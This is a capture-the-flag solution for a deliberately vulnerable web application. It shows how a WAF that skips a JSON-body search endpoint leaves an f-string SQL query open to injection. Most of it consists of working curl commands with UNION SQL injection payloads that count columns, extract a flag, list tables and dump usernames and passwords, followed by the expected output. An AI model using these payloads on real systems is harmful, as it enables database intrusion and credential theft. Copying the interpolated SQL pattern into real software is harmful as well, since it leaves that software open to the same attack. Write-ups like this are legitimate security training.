# WAF Bypass SQLi - Solution

## Vulnerability

The application has two search endpoints:
1. `GET /search?q=...` - protected by WAF (checks URL query params)
2. `POST /api/search` (JSON body) - **WAF is NOT applied** to this endpoint

The WAF middleware explicitly skips the `api_search` endpoint:
```python
if request.endpoint in ('api_search',):
    return None  # Skip WAF for /api/search
```

The `/api/search` endpoint uses direct string interpolation in SQL:
```python
sql_query = f"SELECT id, name, category, description, price FROM products WHERE name LIKE '%{query}%'"
```

## Exploit: UNION-based SQLi via JSON body

### Step 1: Confirm injection
```bash
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": "test"}'
```

### Step 2: Get number of columns (5 in products table)
```bash
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": "x'"'"' UNION SELECT 1,2,3,4,5--"}'
```

### Step 3: Extract the flag from the flags table
```bash
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": "x'"'"' UNION SELECT 1,secret,'"'"'flags'"'"',4,5 FROM flags-- "}'
```

Or with proper JSON string escaping:
```bash
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d "{\"q\": \"x' UNION SELECT 1,secret,'flags',4,5 FROM flags-- \"}"
```

### Expected Response
```json
{
  "count": 1,
  "error": null,
  "results": [
    {
      "category": "flags",
      "description": 4,
      "id": 1,
      "name": "HL4{W4F_BYP4SS_JSON_BODY_SQLi}",
      "price": 5.0
    }
  ]
}
```

## Why the WAF bypass works

The WAF checks `request.args` (URL query parameters) and `request.form` (form POST data):
```python
def check_all_inputs():
    for key, value in request.args.items():  # URL params only
        if waf_check(value):
            return True
    for key, value in request.form.items():  # Form data only
        if waf_check(value):
            return True
    return False
```

It does NOT check `request.get_json()` (the JSON body). The `/api/search` endpoint reads
from the JSON body, which is completely invisible to the WAF.

## Alternative: Table enumeration
```bash
# List all tables
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d "{\"q\": \"x' UNION SELECT 1,name,'tables',4,5 FROM sqlite_master WHERE type='table'-- \"}"

# Get users table
curl -X POST http://TARGET:8080/api/search \
  -H "Content-Type: application/json" \
  -d "{\"q\": \"x' UNION SELECT 1,username||':'||password,'users',4,5 FROM users-- \"}"
```
